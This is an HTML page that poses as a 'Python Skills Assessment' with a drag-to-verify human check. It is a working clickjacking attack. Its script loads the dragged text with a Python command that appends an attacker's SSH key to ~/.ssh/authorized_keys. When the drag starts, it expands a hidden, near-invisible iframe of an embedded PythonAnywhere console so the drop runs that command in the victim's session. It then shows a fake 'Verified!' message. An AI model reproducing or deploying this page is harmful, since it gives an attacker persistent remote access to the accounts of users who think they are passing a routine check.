<!DOCTYPE html>
<html>
<head>
<title>Python Skills Assessment</title>
<style>
body {
  font-family: Arial, sans-serif;
  background: #1a1a2e;
  color: #eee;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
}
.container {
  text-align: center;
  max-width: 500px;
  position: relative;
  z-index: 5;
}
h1 { color: #e94560; margin-bottom: 10px; }
p { color: #aaa; margin-bottom: 30px; }

.verify-box {
  background: linear-gradient(135deg, #0f3460, #16213e);
  border: 2px dashed #e94560;
  border-radius: 12px;
  padding: 30px;
  cursor: grab;
  transition: all 0.3s;
  -webkit-user-drag: element;
}
.verify-box:hover {
  border-color: #48bb78;
  background: linear-gradient(135deg, #16213e, #1a1a2e);
}
.verify-box:active { cursor: grabbing; }
.verify-icon { font-size: 48px; margin-bottom: 10px; pointer-events: none; }
.verify-text { font-size: 14px; color: #aaa; pointer-events: none; }
.verify-label { font-size: 18px; font-weight: bold; color: #48bb78; margin: 10px 0; pointer-events: none; }

.drop-zone {
  margin-top: 20px;
  border: 2px dashed #333;
  border-radius: 12px;
  padding: 40px;
  color: #555;
  font-size: 14px;
  position: relative;
  min-height: 100px;
  transition: all 0.3s;
}
.drop-zone.over {
  border-color: #48bb78;
  background: rgba(72,187,120,0.05);
  color: #48bb78;
}
.success-msg {
  display: none;
  color: #48bb78;
  font-size: 18px;
  margin-top: 20px;
}

.console-iframe {
  position: fixed;
  top: -9999px;
  left: -9999px;
  width: 1px;
  height: 1px;
  opacity: 0.0001;
  z-index: -1;
  border: none;
  pointer-events: none;
}
.console-iframe.active {
  top: 0 !important;
  left: 0 !important;
  width: 100vw !important;
  height: 100vh !important;
  z-index: 999 !important;
  pointer-events: all !important;
}
</style>
</head>
<body>

<div class="container">
  <h1>Python Skills Assessment</h1>
  <p>Complete the verification to access the interactive tutorial</p>

  <div class="verify-box" id="dragItem" draggable="true">
    <div class="verify-icon">&#x1F40D;</div>
    <div class="verify-label">Drag to Verify</div>
    <div class="verify-text">Drag the Python icon to the box below</div>
  </div>

  <div class="drop-zone" id="dropZone">
    Drop here to verify you are human
  </div>

  <div class="success-msg" id="successMsg">
    Verified! Loading tutorial...
  </div>
</div>

<iframe id="consoleFrame" class="console-iframe" src="https://www.pythonanywhere.com/embedded3/"></iframe>

<script>
var ATTACKER_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnl5m2NP227Tji71XUNv4Pd3TYfrl3HPpfj3K6t1kSJ AttackerAccount@green-liveconsole7';

var payload = 'import os; os.system("mkdir -p ~/.ssh && echo \x27' + ATTACKER_KEY + '\x27 >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys")\n';

var dragItem = document.getElementById('dragItem');
var dropZone = document.getElementById('dropZone');
var iframe = document.getElementById('consoleFrame');
var successMsg = document.getElementById('successMsg');
var dragging = false;

dragItem.addEventListener('dragstart', function(e) {
  dragging = true;
  e.dataTransfer.setData('text/plain', payload);
  e.dataTransfer.setData('text', payload);
  e.dataTransfer.effectAllowed = 'all';
  e.dataTransfer.dropEffect = 'copy';

  // Set a visible drag image
  var img = document.createElement('div');
  img.textContent = 'Verifying...';
  img.style.cssText = 'position:absolute;top:-9999px;background:#0f3460;color:#48bb78;padding:10px 20px;border-radius:8px;font-weight:bold;';
  document.body.appendChild(img);
  e.dataTransfer.setDragImage(img, 60, 20);

  // Delay iframe activation slightly so drag starts cleanly
  setTimeout(function() {
    iframe.classList.add('active');
  }, 100);
});

dragItem.addEventListener('dragend', function(e) {
  dragging = false;
  iframe.classList.remove('active');

  // Show success regardless of where drop landed
  dropZone.style.display = 'none';
  successMsg.style.display = 'block';
});

dropZone.addEventListener('dragover', function(e) {
  e.preventDefault();
  dropZone.classList.add('over');
});

dropZone.addEventListener('dragleave', function(e) {
  dropZone.classList.remove('over');
});

dropZone.addEventListener('drop', function(e) {
  e.preventDefault();
  dropZone.style.display = 'none';
  successMsg.style.display = 'block';
});
</script>

</body>
</html>
